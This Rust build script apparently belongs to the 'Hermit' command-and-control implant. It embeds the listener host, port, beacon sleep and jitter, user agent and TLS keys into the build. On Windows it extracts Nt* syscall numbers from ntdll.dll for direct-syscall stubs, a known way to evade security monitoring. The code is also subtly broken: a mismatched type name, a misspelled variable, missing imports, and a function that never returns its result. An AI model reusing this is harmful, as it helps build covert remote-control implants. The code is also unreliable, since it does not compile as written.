use std::{
    collections::BTreeMap,
    env,
    ffi::CStr,
    fs::{self, File},
    io::Write,
    path::Path,
};
#[cfg(target_os = "windows")]
use windows::Win32::System::{
    Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64},
    LibraryLoader::GetModuleHandleA,
    SystemServices::{IMAGE_DOS_HEADERS, IMAGE_EXPORT_DIRECTORY}
};

fn main() {
    // Read environment variables for initiali settings
    let lproto = env::var_os("HERMIT_LPROTO").unwrap();
    let lhost = env::var_os("HERMIT_LHOST").unwrap();
    let lport = env::var_os("HERMIT_LPORT").unwrap();
    let sleep = env::var_os("HERMIT_SLEEP").unwrap();
    let jitter = env::var_os("HERMIT_JITTER").unwrap();
    let user_agent = env::var_os("HERMIT_USER_AGENT").unwrap();
    let https_root_cert = env::var_os("HERMIT_HTTPS_ROOT_CERT").unwrap();
    let https_client_cert = env::var_os("HERMIT_HTTPS_CLIENT_CERT").unwrap();
    let https_client_key = env::var_os("HERMIT_HTTPS_CLIENT_KEY").unwrap();
    let server_public_key = env::var_os("HERMIT_PUBLIC_KEY").unwrap();

    let out_dir = env::var_os("OUT_DIR").unwrap(); // This is not allowed the prefix `HERMIT_` by cargo.
    let dest_path = Path::new(&out_dir).join("init.rs");

    fs::write(
        &dest_path,
        format!("pub fn init() -> (
            &'static str,
            &'static str,
            u16,
            u64,
            u64,
            &'static str,
            &'static str,
            &'static str,
            &'static str,
            &'static str,
        ) {}
            (\"{}\", \"{}\", {}, {}, {}, \"{}\", \"{}\", \"{}\", \"{}\", \"{}\")
        {}
        ",
        "{",
        lproto.into_string().unwrap(),
        lhost.into_string().unwrap(),
        lport.into_string().unwrap(),
        sleep.into_string().unwrap(),
        jitter.into_string().unwrap(),
        user_agent.into_string().unwrap(),
        https_root_cert.into_string().unwrap(),
        https_client_cert.into_string().unwrap(),
        https_client_key.into_string().unwrap(),
        server_public_key.into_string().unwrap(),
        "}"
    )).unwrap();

    println!("cargo:rerun-if-changed=build.rs");

    #[cfg(target_os = "windows")]
    write_syscall_ids();
}

// Reference:
//  https://github.com/felix-rs/ntcall-rs/blob/290745855f561a106c53e25abee1e3d7a9065874/build.rs
#[cfg(target_os = "windows")]
fn write_syscall_ids() {
    let mut file = File::create("resources/syscall_ids").unwrap();

    for (name, addr) in get_ntdll_exports() {
        if name.starts_with("Nt") {
            if let Some(sys_id) = get_syscall_id(addr) {
                file.write_all(format!("define_syscall {}, {}\n", name, sys_id).as_bytes())
                    .unwrap();
            }
        }
    }
}

#[cfg(target_os = "windows")]
fn get_syscall_id(func_addr: usize) -> Option<String> {
    let u8s = unsafe { core::slice::from_raw_parts(func_addr as *const u8, 8) };
    let mut decoder = Decoder::with_ip(64, u8s, 0, DecoderOptions::NONE);

    let mut formatter = NasmFormatter::new();

    formatter.options_mut().set_digit_separator("`");
    formatter.options_mut().set_first_operand_char_index(10);

    let mut output = String::new();

    let mut instruction = Instruction::default();

    while decoder.can_decode() {
        decoder.decode_out(&mut instruction);

        output.clear();
        formatter.format(&instruction, &mut output);

        if output.contains("eax") {
            return Some(format!(
                "0x{}",
                output.split_once("eax,")?.1.to_string().replace('h', "")
            ));
        }
    }

    None
}

// Reference:
//  https://github.com/felix-rs/ntcall-rs/blob/290745855f561a106c53e25abee1e3d7a9065874/build.rs#L61
#[cfg(target_os = "windows")]
fn get_ntdll_exports() -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();

    unsafe {
        let module_base = GetModuleHandleA("ntdll.dll\0".as_ptr() as _);

        let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);
        if dos_header.e_magic == 0x5A4D {
            let nt_header =
                (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

            if (*nt_header).Signature == 0x4550 {
                let export_directory = (module_base as usize
                    + (*nt_header).OptionalHeader.DataDirectory
                        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
                        .VirtualAddress as usize)
                    as *mut IMAGE_EXPORT_DIRECTORY;

                let names = core::slice::from_raw_parts(
                    (module_base as usize + (*export_directory).AddressOfNames as usize)
                        as *const u32,
                    (*export_directory).NumberOfNames as _,
                );

                let functions = core::slice::from_raw_parts(
                    (module_base as usize + (*export_directory).AddressOfFunctions as usize)
                        as *const u32,
                    (*export_directory).NumberOfFunctions as _,
                );

                let ordinals = core::slice::from_raw_parts(
                    (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
                        as *const u16,
                    (*export_directory).NumberOfNames as _,
                );

                for i in 0..(*export_directory).NumberOfNames {
                    let name = (module_base as usize + names[i as usize] as usize) as *const c_char;

                    if let Ok(name) = CStr::from_ptr(name).to_str() {
                        let ordinal = oridnals[i as usize] as usize;

                        exports.insert(
                            name.to_string(),
                            module_base as usize + functions[ordinal] as usize,
                        );
                    }
                }
            }
        }
    }
}